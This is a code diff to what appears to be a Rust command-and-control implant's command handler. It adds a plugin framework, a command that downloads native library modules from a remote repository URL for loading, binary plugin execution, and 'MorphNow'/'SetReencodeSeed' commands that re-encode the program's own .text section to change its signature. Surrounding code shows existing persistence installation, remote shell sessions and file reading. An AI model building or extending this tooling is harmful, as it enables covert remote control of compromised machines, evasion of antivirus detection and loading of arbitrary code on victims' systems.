@@ -1,7 +1,7 @@
 use base64::Engine;
 use common::{config::Config, AuditEvent, Command, CryptoSession, Outcome};
 use lazy_static::lazy_static;
-use module_loader::Plugin;
+use module_loader::LoadedPlugin;
 use std::collections::HashMap;
 use std::path::Path;
 use std::sync::{Arc, Mutex};
@@ -22,12 +22,25 @@ pub(crate) fn is_valid_module_id(id: &str) -> bool {
             .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
 }
 
+/// Tracks the state of an asynchronous plugin job.
+struct PluginJob {
+    /// The plugin that owns this job.
+    plugin_id: String,
+    /// Current status of the job.
+    status: String, // "running", "completed", "failed"
+    /// Output data, if available.
+    output: Option<String>,
+}
+
 lazy_static! {
     static ref SHELL_SESSIONS: Mutex<HashMap<String, Arc<Mutex<shell::ShellSession>>>> =
         Mutex::new(HashMap::new());
-    static ref LOADED_PLUGINS: Mutex<HashMap<String, Arc<Box<dyn Plugin + Send + Sync>>>> =
+    static ref LOADED_PLUGINS: Mutex<HashMap<String, LoadedPlugin>> =
         Mutex::new(HashMap::new());
     pub static ref SHUTDOWN_NOTIFY: Arc<tokio::sync::Notify> = Arc::new(tokio::sync::Notify::new());
+    /// Registry of asynchronous plugin jobs keyed by job ID.
+    static ref PLUGIN_JOBS: Mutex<HashMap<String, PluginJob>> =
+        Mutex::new(HashMap::new());
 }
 
 fn sanitize_action(cmd: &Command) -> String {
@@ -90,10 +103,24 @@ pub(crate) fn push_module(
     }
     match module_loader::load_plugin(encrypted_blob, crypto, verify_key) {
         Ok(plugin) => {
+            let metadata = plugin
+                .get_metadata()
+                .unwrap_or_else(|| module_loader::PluginMetadata::default_for(&module_name));
+            let load_timestamp = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_secs();
             LOADED_PLUGINS
                 .lock()
                 .unwrap()
-                .insert(module_name.clone(), Arc::new(plugin));
+                .insert(
+                    module_name.clone(),
+                    LoadedPlugin {
+                        plugin: Arc::new(plugin),
+                        metadata,
+                        load_timestamp,
+                    },
+                );
             Ok(format!("Module '{}' loaded via push", module_name))
         }
         Err(e) => Err(e.to_string()),
@@ -105,9 +132,10 @@ pub async fn handle_command(
     config: Arc<TokioMutex<Config>>,
     command: Command,
     operator_id: &str,
-) -> (Result<String, String>, AuditEvent) {
+) -> (Result<String, String>, Option<Vec<u8>>, AuditEvent) {
     let action = sanitize_action(&command);
 
+    let mut result_data: Option<Vec<u8>> = None;
     let result: Result<String, String> = match command {
         Command::Ping => Ok("pong".to_string()),
         Command::GetSystemInfo => handle_system_info(),
@@ -270,10 +298,24 @@ pub async fn handle_command(
                     Err(e) => Err(format!("Failed to read module blob: {e}")),
                     Ok(blob) => match module_loader::load_plugin(&blob, &crypto, cfg.module_verify_key.as_deref()) {
                         Ok(plugin) => {
+                            let metadata = plugin
+                                .get_metadata()
+                                .unwrap_or_else(|| module_loader::PluginMetadata::default_for(module_id));
+                            let load_timestamp = std::time::SystemTime::now()
+                                .duration_since(std::time::UNIX_EPOCH)
+                                .unwrap_or_default()
+                                .as_secs();
                             LOADED_PLUGINS
                                 .lock()
                                 .unwrap()
-                                .insert(module_id.clone(), Arc::new(plugin));
+                                .insert(
+                                    module_id.clone(),
+                                    LoadedPlugin {
+                                        plugin: Arc::new(plugin),
+                                        metadata,
+                                        load_timestamp,
+                                    },
+                                );
                             Ok("Module deployed".to_string())
                         }
                         Err(e) => Err(e.to_string()),
@@ -287,15 +329,33 @@ pub async fn handle_command(
             ref args,
         } => {
             // Clone the Arc while holding the lock, then release the lock
-            // before calling execute() so other plugin operations (DeployModule,
-            // subsequent ExecutePlugin calls) are not serialised behind a
-            // long-running plugin execution.
+            // before calling execute() so other plugin operations are not
+            // serialised behind a long-running plugin execution.
             let maybe_plugin = {
                 let plugins = LOADED_PLUGINS.lock().unwrap();
-                plugins.get(plugin_id).map(Arc::clone)
+                plugins.get(plugin_id).map(|lp| lp.plugin.clone())
             };
             match maybe_plugin {
-                Some(plugin) => (**plugin).execute(args).map_err(|e| e.to_string()),
+                Some(plugin) => match (**plugin).execute(args) {
+                    Ok(result) => {
+                        // Check for async job marker.
+                        if let Some(rest) = result.strip_prefix("__ASYNC_JOB__:") {
+                            let job_id = rest.to_string();
+                            PLUGIN_JOBS.lock().unwrap().insert(
+                                job_id.clone(),
+                                PluginJob {
+                                    plugin_id: plugin_id.clone(),
+                                    status: "running".to_string(),
+                                    output: None,
+                                },
+                            );
+                            Ok(format!("Job started: {job_id}"))
+                        } else {
+                            Ok(result)
+                        }
+                    }
+                    Err(e) => Err(e.to_string()),
+                },
                 None => Err(format!("Plugin '{plugin_id}' not loaded")),
             }
         }
@@ -320,6 +380,37 @@ pub async fn handle_command(
                 .map_err(|e| e.to_string())
         }
 
+        #[cfg(feature = "self-reencode")]
+        Command::SetReencodeSeed { seed } => {
+            crate::self_reencode::set_seed(seed);
+            log::info!("self-reencode seed updated to {seed:#018x}");
+            Ok(format!("Re-encode seed set to {seed:#018x}"))
+        }
+        #[cfg(not(feature = "self-reencode"))]
+        Command::SetReencodeSeed { .. } => {
+            Err("self-reencode feature not enabled".to_string())
+        }
+
+        /// MorphNow: immediately re-encode .text with the supplied seed and
+        /// return the SHA-256 hash of the resulting .text section.
+        #[cfg(feature = "self-reencode")]
+        Command::MorphNow { seed } => {
+            match crate::self_reencode::morph_now(seed) {
+                Ok(hash) => {
+                    log::info!("MorphNow completed: .text hash = {hash}");
+                    Ok(hash)
+                }
+                Err(e) => {
+                    log::error!("MorphNow failed: {e:#}");
+                    Err(format!("MorphNow failed: {e:#}"))
+                }
+            }
+        }
+        #[cfg(not(feature = "self-reencode"))]
+        Command::MorphNow { .. } => {
+            Err("self-reencode feature not enabled".to_string())
+        }
+
         #[cfg(feature = "persistence")]
         Command::EnablePersistence => crate::persistence::install_persistence()
             .map(|p| format!("Persistence installed at {}", p.display()))
@@ -334,6 +425,138 @@ pub async fn handle_command(
         #[cfg(not(feature = "persistence"))]
         Command::DisablePersistence => Err("persistence feature not enabled".to_string()),
 
+        // ── Plugin Framework commands ──
+
+        Command::ListPlugins => {
+            let plugins = LOADED_PLUGINS.lock().unwrap();
+            let meta_list: Vec<_> = plugins.values().map(|lp| &lp.metadata).collect();
+            serde_json::to_string(&meta_list).map_err(|e| e.to_string())
+        }
+
+        Command::UnloadPlugin { ref plugin_id } => {
+            let removed = LOADED_PLUGINS.lock().unwrap().remove(plugin_id);
+            // Dropping the LoadedPlugin drops the inner Arc<Box<dyn Plugin>>,
+            // which triggers destroy via the FfiPlugin Drop implementation.
+            if removed.is_some() {
+                Ok(format!("Plugin '{plugin_id}' unloaded"))
+            } else {
+                Err(format!("Plugin '{plugin_id}' not loaded"))
+            }
+        }
+
+        Command::GetPluginInfo { ref plugin_id } => {
+            let plugins = LOADED_PLUGINS.lock().unwrap();
+            match plugins.get(plugin_id) {
+                Some(lp) => {
+                    serde_json::to_string(&lp.metadata).map_err(|e| e.to_string())
+                }
+                None => Err(format!("Plugin '{plugin_id}' not loaded")),
+            }
+        }
+
+        Command::DownloadModule {
+            ref module_id,
+            ref repo_url,
+        } => {
+            if !is_valid_module_id(module_id) {
+                Err("Invalid module_id (allowed: [a-zA-Z0-9_-]{1,128})".to_string())
+            } else {
+                let cfg = config.lock().await.clone();
+                let url = repo_url
+                    .clone()
+                    .unwrap_or_else(|| cfg.module_repo_url.clone());
+                let fetch_url = format!("{}/{}.{}", url.trim_end_matches('/'), module_id, std::env::consts::DLL_EXTENSION);
+                match reqwest::get(&fetch_url).await {
+                    Ok(resp) => {
+                        if !resp.status().is_success() {
+                            return (
+                                Err(format!("Download failed: HTTP {}", resp.status())),
+                                None,
+                                make_audit(
+                                    &action,
+                                    Outcome::Failure,
+                                    &format!("HTTP {}", resp.status()),
+                                    operator_id,
+                                ),
+                            );
+                        }
+                        match resp.bytes().await {
+                            Ok(blob) => {
+                                let path = Path::new(&cfg.module_cache_dir).join(format!(
+                                    "{}.{}",
+                                    module_id,
+                                    std::env::consts::DLL_EXTENSION
+                                ));
+                                if let Err(e) = std::fs::create_dir_all(
+                                    Path::new(&cfg.module_cache_dir),
+                                ) {
+                                    return (
+                                        Err(format!("Failed to create cache dir: {e}")),
+                                        None,
+                                        make_audit(
+                                            &action,
+                                            Outcome::Failure,
+                                            &e.to_string(),
+                                            operator_id,
+                                        ),
+                                    );
+                                }
+                                match std::fs::write(&path, &blob) {
+                                    Ok(_) => Ok(format!(
+                                        "Module '{}' downloaded to {}",
+                                        module_id,
+                                        path.display()
+                                    )),
+                                    Err(e) => Err(format!("Failed to write module: {e}")),
+                                }
+                            }
+                            Err(e) => Err(format!("Failed to read response body: {e}")),
+                        }
+                    }
+                    Err(e) => Err(format!("Download request failed: {e}")),
+                }
+            }
+        }
+
+        Command::ExecutePluginBinary {
+            ref plugin_id,
+            ref input_data,
+        } => {
+            let maybe_plugin = {
+                let plugins = LOADED_PLUGINS.lock().unwrap();
+                plugins.get(plugin_id).map(|lp| lp.plugin.clone())
+            };
+            match maybe_plugin {
+                Some(plugin) => {
+                    match (**plugin).execute_binary(input_data) {
+                        Ok(output) => {
+                            let len = output.len();
+                            result_data = Some(output);
+                            Ok(format!("Binary result: {} bytes", len))
+                        }
+                        Err(e) => Err(e.to_string()),
+                    }
+                }
+                None => Err(format!("Plugin '{plugin_id}' not loaded")),
+            }
+        }
+
+        Command::JobStatus { ref job_id } => {
+            let jobs = PLUGIN_JOBS.lock().unwrap();
+            match jobs.get(job_id) {
+                Some(job) => {
+                    let info = serde_json::json!({
+                        "job_id": job_id,
+                        "plugin_id": job.plugin_id,
+                        "status": job.status,
+                        "output": job.output,
+                    });
+                    Ok(info.to_string())
+                }
+                None => Err(format!("Job '{job_id}' not found")),
+            }
+        }
+
         Command::Shutdown => {
             SHUTDOWN_NOTIFY.notify_one();
             Ok("Agent shutdown sequence initiated".to_string())
@@ -345,7 +568,7 @@ pub async fn handle_command(
         Err(e) => (Outcome::Failure, e.clone()),
     };
     let audit = make_audit(&action, outcome, &details, operator_id);
-    (result, audit)
+    (result, result_data, audit)
 }
 
 fn handle_system_info() -> Result<String, String> {
@@ -393,7 +616,7 @@ mod tests {
         let cfg = Config::default();
         let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
         let cfg_arc = Arc::new(TokioMutex::new(cfg));
-        let (res, audit) = handle_command(
+        let (res, _, audit) = handle_command(
             crypto,
             cfg_arc,
             Command::DeployModule {
@@ -426,7 +649,7 @@ mod tests {
         let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
         let cfg_arc = Arc::new(TokioMutex::new(cfg));
 
-        let (res, _audit) = handle_command(
+        let (res, _, _audit) = handle_command(
             crypto,
             cfg_arc,
             Command::DeployModule {
@@ -471,7 +694,7 @@ mod tests {
             ..Config::default()
         };
         let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
-        let (res, audit) = handle_command(
+        let (res, _result_data, audit) = handle_command(
             crypto,
             Arc::new(TokioMutex::new(cfg)),
             Command::ReadFile {
@@ -510,7 +733,7 @@ mod tests {
         let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
         let cfg_arc = Arc::new(TokioMutex::new(Config::default()));
 
-        let (start_res, _) = handle_command(
+        let (start_res, _, _) = handle_command(
             crypto.clone(),
             cfg_arc.clone(),
             Command::StartShell,
@@ -534,7 +757,7 @@ mod tests {
         // Give the shell a moment to produce output.
         tokio::time::sleep(std::time::Duration::from_millis(50)).await;
 
-        let (out_res, audit) = handle_command(
+        let (out_res, _, audit) = handle_command(
             crypto.clone(),
             cfg_arc.clone(),
             Command::ShellOutput {
